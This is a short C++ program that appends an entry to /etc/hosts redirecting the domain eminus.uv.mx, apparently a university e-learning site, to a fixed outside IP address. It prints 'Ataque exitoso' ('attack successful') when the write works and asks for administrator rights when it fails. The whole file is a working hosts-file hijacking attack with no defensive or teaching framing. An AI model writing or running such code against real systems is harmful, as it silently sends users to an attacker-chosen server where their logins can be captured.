#include  <iostream>
#include <fstream>
using namespace std;

int main()
{
	ofstream myfile("/etc/hosts", ios::out | ios::app);
	if (myfile.is_open())
	{
		myfile << "\n20.225.187.207 eminus.uv.mx";
		myfile.close();
		cout << "Ataque exitoso" << endl;
	}
	else
	{
		cout << "Se requieren permisos de administrador." << endl;
	}

	cin.get();

	return 0;
}
